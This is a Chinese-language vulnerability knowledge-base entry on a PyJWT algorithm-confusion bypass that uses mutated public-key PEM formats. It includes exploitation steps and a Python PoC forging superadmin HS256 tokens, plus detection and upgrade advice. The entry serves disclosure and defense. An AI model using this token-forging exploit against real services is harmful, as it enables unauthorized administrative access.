---
id: web-generic-jwt-pyjwt-mutated-pem-hmac-guard-bypass
title: PyJWT 变异 PEM 绕过 HMAC 公钥防护：CR/缩进/折叠公钥当对称密钥伪造 JWT
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-algorithm-confusion-pem-variant
aliases:
- CVE-2026-102268
- PyJWT PEM 检测绕过
- 变异公钥 HMAC 混淆
- PyJWT algorithm confusion bypass
tags:
- web
- jwt
- pyjwt
- algorithm-confusion
- pem
- hmac
- cve
cve:
- CVE-2026-102268
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: PyJWT <= 2.13.0（< 2.14.0，修复版本 2.14.0）
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T04:47:57+08:00'
  notes: 已对照原文全文与17张图核对：PyJWT 2.13.0 HMACAlgorithm.prepare_key 的 is_pem_format 结构正则不认变异 PEM，cryptography loader 接受；混合列表下裸CR变异签名后 /protected 200 sub=attacker role=superadmin，tab/折叠 401；严格列表 401 InvalidAlgorithmError；2.14.0 三变异 is_pem_format=True 且 encode 抛 InvalidKeyError；版本区间 <=2.13.0、修复 2.14.0 与原文一致。affected_versions 保留。未复现PoC。
---

## 一句话结论

PyJWT ≤ 2.13.0 用严格结构正则判断“是否非对称 PEM”，而 `cryptography` 加载器按 RFC 7468 接受裸 CR、END 前缩进、单行折叠等变体；在混合算法允许列表下，把公钥改成这些形态即可作为 HMAC 密钥，伪造任意 claims 的 HS256 令牌通过验证。

## 原理

PyJWT 的 `HMACAlgorithm.prepare_key` 用 `is_pem_format()` 拦“公钥当 HMAC 密钥”：该正则要求 BEGIN 标记行以 LF 结尾、END 标记紧贴 LF、整体呈三段结构。而 `cryptography` 的 `load_pem_public_key` 遵循 RFC 7468“生成严格、解析宽松”，接受裸 CR 行尾、标记前后空白、单行折叠等形态。

验证路径由令牌头的 `alg` 选择算法对象：允许列表混用 `["ES256","HS256"]` 时，攻击者把 `alg` 设为 `HS256`，同一个部署密钥字节被交给 `HMACAlgorithm.prepare_key`。只要密钥是“加载器接受、正则不识别”的变异形态，检查放行，公钥字节原样进入 `hmac.new`。HMAC 是字节精确的：攻击者用同一份变异公钥字节签名，服务端用同一份字节重算，签名必然一致。

`check_key_length` 只比较长度（HS256 门槛 32 字节），公钥 PEM 远超此值，`enforce_minimum_key_length` 也拦不住。`PyJWK` 路径因构造时绑定算法而免疫；只允许单一非对称算法的列表在 `alg` 成员检查处即拒绝。

## 触发条件

- PyJWT ≤ 2.13.0，且安装了 `cryptography`（非对称验证与 PEM 加载依赖）；
- `jwt.decode` 的 `algorithms` 同时包含 HMAC 与非对称算法（如 `["ES256","HS256"]`）；
- 验证密钥以原始 PEM 文本/字节传入，而非 `PyJWK`/`PyJWKClient`；
- 该 PEM 处于加载器接受但 PyJWT 正则不识别的变异形态：裸 CR 行尾、END 标记前有 tab/缩进、整体折叠为单行（常见于 YAML/JSON 缩进块、单行环境变量、LF→CR 转换管道）；
- 攻击者已知公钥（公钥本公开）。

## 利用步骤

1. 从 `/pubkey`、JWKS、证书透明日志或代码仓库获取公钥规范 PEM；
2. 按目标配置管道的可能损坏方式生成变异形态（裸 CR、END 前 tab、折叠单行）；
3. 用变异公钥字节作为 HS256 密钥，签发 `{"sub":"attacker","role":"superadmin","iat":now,"exp":now+600}`；
4. 发送到验证端点；若返回 `InvalidSignatureError` 说明形态不匹配，换另一种变异重试；返回 200 即成功；
5. 若返回 `InvalidAlgorithmError`，说明目标只允许非对称算法或未走原始字节路径，放弃。

## PoC

```python
import jwt, time

pub = open("public.pem", "rb").read()

mutations = {
    "tab-before-END": pub.replace(b"-----END", b"\t-----END", 1),
    "bare-CR": pub.replace(b"\n", b"\r"),
    "folded": b" ".join(pub.split()),
}

claims = {"sub": "attacker", "role": "superadmin",
          "iat": int(time.time()), "exp": int(time.time()) + 600}

for name, key in mutations.items():
    forged = jwt.encode(claims, key, algorithm="HS256")
    # 本地复验：混合允许列表下应被接受
    jwt.decode(forged, key, algorithms=["ES256", "HS256"])
    print(name, forged)
```

服务端等价配置（存在漏洞）：

```python
jwt.decode(token, PUBLIC_PEM.replace(b"\n", b"\r"),
           algorithms=["ES256", "HS256"])
```

## 变体与关联

- 三种已证实变异：END 前 tab/缩进、LF 全换裸 CR、空白折叠单行；CRLF（`\r\n`）仍被正则识别，不构成绕过；
- RSA 与 EC 公钥均受影响，失败点相同（结构识别）；
- 同源算法混淆：RS256→HS256 直接用规范公钥（旧版/其他库无防护时）、JWK/JKU 头注入；
- 修复版改为“标记扫描 + BEGIN/END 位置配对”状态机，不再依赖整体结构；但“什么是 PEM”仍有两个实现，标签集封闭，未来加载器放宽仍可能出现新缝隙。

## 检测与防御

- 检测：本应只出现非对称令牌的端点出现 `alg=HS256`；大量 `InvalidSignatureError` 后突然 200（在线枚举变异形态）；用部署实际密钥字节同时调用 `is_pem_format()` 与 `load_pem_public_key()`，前者 False、后者接受且允许列表混用时即为可利用；
- 防御：升级 PyJWT ≥ 2.14.0；`algorithms` 只保留单一算法族（如 `["ES256"]`）；改用 `PyJWK`/`PyJWKClient` 绑定算法；审计密钥进入应用的管道，确保规范 PEM（标准 LF、标记无多余空白）；
- 无效缓解：`enforce_minimum_key_length`、WAF 关键词拦截（签名是合法 HMAC，流量无恶意特征）。
